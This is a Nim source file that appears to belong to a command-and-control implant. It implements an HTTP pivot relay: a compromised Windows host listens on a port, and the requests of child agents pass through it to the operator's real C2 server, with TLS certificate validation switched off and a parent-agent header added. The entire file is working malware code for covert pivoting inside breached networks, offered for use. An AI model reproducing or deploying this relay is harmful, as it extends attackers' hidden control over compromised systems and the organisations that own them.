## http_pivot.nim — HTTP pivot relay server.
## Agent starts a plain-HTTP/HTTPS-relay server; child agents point their
## ServerUrl here. Each request is forwarded upstream to the real C2.

import winim/lean, winim/inc/winhttp
import std/strutils
import config

var gHttpPivotStop   {.volatile.}: bool = true
var gHttpPivotSock:  SOCKET = INVALID_SOCKET
var gHttpPivotThread: HANDLE = 0
var gHttpPivotPort:  int = 0
var gHttpPivotAgentID*: string = ""

proc parseC2Url(): (string, int, bool) =
  var url = ServerUrl
  var isHttps = false
  var dport = 80
  if url.startsWith("https://"): url = url[8..^1]; isHttps = true; dport = 443
  elif url.startsWith("http://"): url = url[7..^1]
  let si = url.find('/')
  if si >= 0: url = url[0..<si]
  let ci = url.rfind(':')
  if ci >= 0:
    let p = try: parseInt(url[ci+1..^1]) except: dport
    return (url[0..<ci], p, isHttps)
  return (url, dport, isHttps)

proc httpPivotForward(meth, path, contentType: string;
                      body: pointer; bodyLen: int): (int, seq[byte]) =
  ## Forward a request to the real C2 using WinHTTP.
  let (host, port2, isHttps) = parseC2Url()
  let hSess = WinHttpOpen(newWideCString("endgame-pivot/1.0"),
    WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)
  if hSess == nil: return (-1, @[])
  defer: discard WinHttpCloseHandle(hSess)
  let hConn = WinHttpConnect(hSess, newWideCString(host), INTERNET_PORT(port2), 0)
  if hConn == nil: return (-1, @[])
  defer: discard WinHttpCloseHandle(hConn)
  let flags: DWORD = if isHttps: WINHTTP_FLAG_SECURE else: DWORD(0)
  let hReq = WinHttpOpenRequest(hConn, newWideCString(meth),
    newWideCString(path), nil, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags)
  if hReq == nil: return (-1, @[])
  defer: discard WinHttpCloseHandle(hReq)
  var secFlags = DWORD(SECURITY_FLAG_IGNORE_UNKNOWN_CA or SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE or
    SECURITY_FLAG_IGNORE_CERT_CN_INVALID or SECURITY_FLAG_IGNORE_CERT_DATE_INVALID)
  discard WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, addr secFlags, DWORD(sizeof(secFlags)))
  var extraHdrs = ""
  if contentType != "": extraHdrs.add("Content-Type: " & contentType & "\r\n")
  if gHttpPivotAgentID != "": extraHdrs.add("X-C2-Parent: " & gHttpPivotAgentID & "\r\n")
  if extraHdrs != "":
    discard WinHttpAddRequestHeaders(hReq, newWideCString(extraHdrs),
      DWORD(extraHdrs.len), WINHTTP_ADDREQ_FLAG_ADD)
  let bodyPtr = if body != nil: cast[LPVOID](body) else: WINHTTP_NO_REQUEST_DATA
  if WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
      bodyPtr, DWORD(bodyLen), DWORD(bodyLen), 0) == 0:
    return (-1, @[])
  if WinHttpReceiveResponse(hReq, nil) == 0: return (-1, @[])
  var sc: DWORD = 0; var scLen = DWORD(sizeof(sc))
  discard WinHttpQueryHeaders(hReq,
    WINHTTP_QUERY_STATUS_CODE or WINHTTP_QUERY_FLAG_NUMBER,
    WINHTTP_HEADER_NAME_BY_INDEX, addr sc, addr scLen, WINHTTP_NO_HEADER_INDEX)
  var respData: seq[byte] = @[]
  var dwSize: DWORD = 0
  while WinHttpQueryDataAvailable(hReq, addr dwSize) != 0 and dwSize > 0:
    var chunk = newSeq[byte](int(dwSize))
    var dwDL: DWORD = 0
    if WinHttpReadData(hReq, cast[LPVOID](addr chunk[0]), dwSize, addr dwDL) != 0:
      respData.add(chunk[0..<int(dwDL)])
    else: break
  return (int(sc), respData)

type HttpRelayParam = object
  clientSock: SOCKET

proc httpRelayProc(p: LPVOID): DWORD {.stdcall.} =
  if p == nil: return 1
  let rp = cast[ptr HttpRelayParam](p)
  let clientSock = rp.clientSock
  dealloc(p)
  defer: discard closesocket(clientSock)
  const BUFSZ = 65536
  let reqBuf = cast[ptr byte](alloc0(BUFSZ + 1))
  defer: dealloc(reqBuf)
  var totalRecv = 0
  var contentLength = 0
  var hdrsEndPos = -1
  # Read until we have full headers + body
  while totalRecv < BUFSZ:
    let n = recv(clientSock, cast[ptr char](cast[int](reqBuf) + totalRecv),
      int32(BUFSZ - totalRecv), 0)
    if n <= 0: return 1
    totalRecv += n
    cast[ptr char](cast[int](reqBuf) + totalRecv)[] = '\0'
    if hdrsEndPos < 0:
      # Convert to string to search for \r\n\r\n
      var s = newString(totalRecv)
      copyMem(addr s[0], reqBuf, totalRecv)
      let hi = s.find("\r\n\r\n")
      if hi >= 0:
        hdrsEndPos = hi
        for line in s[0..<hi].splitLines():
          if line.toLowerAscii().startsWith("content-length:"):
            try: contentLength = parseInt(line[15..^1].strip()) except: discard
    if hdrsEndPos >= 0:
      let bodyReceived = totalRecv - (hdrsEndPos + 4)
      if bodyReceived >= contentLength: break
  var reqStr = newString(totalRecv)
  copyMem(addr reqStr[0], reqBuf, totalRecv)
  # Parse request line
  let hdrsEndIdx = reqStr.find("\r\n\r\n")
  if hdrsEndIdx < 0:
    discard send(clientSock, "HTTP/1.1 400 Bad Request\r\n\r\n", 28, 0)
    return 1
  let hdrs = reqStr[0..<hdrsEndIdx]
  let firstNewline = hdrs.find("\r\n")
  let firstLine = if firstNewline >= 0: hdrs[0..<firstNewline] else: hdrs
  let parts = firstLine.splitWhitespace()
  if parts.len < 2:
    discard send(clientSock, "HTTP/1.1 400 Bad Request\r\n\r\n", 28, 0)
    return 1
  let meth = parts[0]
  let path = parts[1]
  var ct = ""
  for line in hdrs.splitLines():
    if line.toLowerAscii().startsWith("content-type:"):
      ct = line[13..^1].strip(); break
  let bodyStart = hdrsEndIdx + 4
  let bodyLen = totalRecv - bodyStart
  let bodyPtr: pointer = if bodyLen > 0: cast[pointer](cast[int](reqBuf) + bodyStart) else: nil
  let (status, respData) = httpPivotForward(meth, path, ct, bodyPtr, bodyLen)
  # Build HTTP response
  let statusLine = if status == 204: "HTTP/1.1 204 No Content\r\n"
                   elif status <= 0: "HTTP/1.1 502 Bad Gateway\r\n"
                   else: "HTTP/1.1 " & $status & " OK\r\n"
  var resp = statusLine
  if respData.len > 0:
    resp.add("Content-Length: " & $respData.len & "\r\n")
    resp.add("Content-Type: application/octet-stream\r\n")
    resp.add("\r\n")
    discard send(clientSock, cast[ptr char](addr resp[0]), int32(resp.len), 0)
    discard send(clientSock, cast[ptr char](unsafeAddr respData[0]), int32(respData.len), 0)
  else:
    resp.add("Content-Length: 0\r\n\r\n")
    discard send(clientSock, cast[ptr char](addr resp[0]), int32(resp.len), 0)
  return 0

proc httpPivotServerProc(p: LPVOID): DWORD {.stdcall.} =
  var wsaData: WSADATA
  discard WSAStartup(WORD(0x0202), addr wsaData)
  let port = cast[int](p)
  let listenSock = socket(int32(AF_INET), int32(SOCK_STREAM), int32(IPPROTO_TCP))
  if listenSock == INVALID_SOCKET: return 1
  gHttpPivotSock = listenSock
  var lsa: sockaddr_in
  lsa.sin_family      = int16(AF_INET)
  lsa.sin_port        = htons(uint16(port))
  lsa.sin_addr.S_addr = int32(0)
  var reuseOpt: int32 = 1
  discard setsockopt(listenSock, int32(SOL_SOCKET), int32(SO_REUSEADDR),
    cast[ptr char](addr reuseOpt), int32(sizeof(reuseOpt)))
  if `bind`(listenSock, cast[ptr sockaddr](addr lsa), int32(sizeof(lsa))) != 0:
    discard closesocket(listenSock); gHttpPivotSock = INVALID_SOCKET; return 1
  if listen(listenSock, 16) != 0:
    discard closesocket(listenSock); gHttpPivotSock = INVALID_SOCKET; return 1
  while not gHttpPivotStop:
    var cAddr: sockaddr_in; var cLen: int32 = int32(sizeof(cAddr))
    let cSock = accept(listenSock, cast[ptr sockaddr](addr cAddr), addr cLen)
    if cSock == INVALID_SOCKET: break
    let rp = cast[ptr HttpRelayParam](alloc0(sizeof(HttpRelayParam)))
    rp.clientSock = cSock
    var tid: DWORD = 0
    discard CloseHandle(CreateThread(nil, 0, httpRelayProc, cast[LPVOID](rp), 0, addr tid))
  discard closesocket(listenSock)
  gHttpPivotSock = INVALID_SOCKET
  return 0

proc startHttpPivot*(port: int): string =
  if not gHttpPivotStop:
    return "[-] HTTP pivot already running on port " & $gHttpPivotPort
  gHttpPivotStop = false
  gHttpPivotPort = port
  var tid: DWORD = 0
  gHttpPivotThread = CreateThread(nil, 0, httpPivotServerProc, cast[LPVOID](port), 0, addr tid)
  if gHttpPivotThread == 0:
    gHttpPivotStop = true
    return "[-] HTTP pivot: CreateThread failed"
  return "[+] HTTP pivot started on port " & $port & " → " & ServerUrl

proc stopHttpPivot*(): string =
  if gHttpPivotStop:
    return "[-] HTTP pivot not running"
  gHttpPivotStop = true
  if gHttpPivotSock != INVALID_SOCKET:
    discard closesocket(gHttpPivotSock)
  if gHttpPivotThread != 0:
    discard WaitForSingleObject(gHttpPivotThread, DWORD(3000))
    discard CloseHandle(gHttpPivotThread)
    gHttpPivotThread = 0
  return "[+] HTTP pivot stopped"
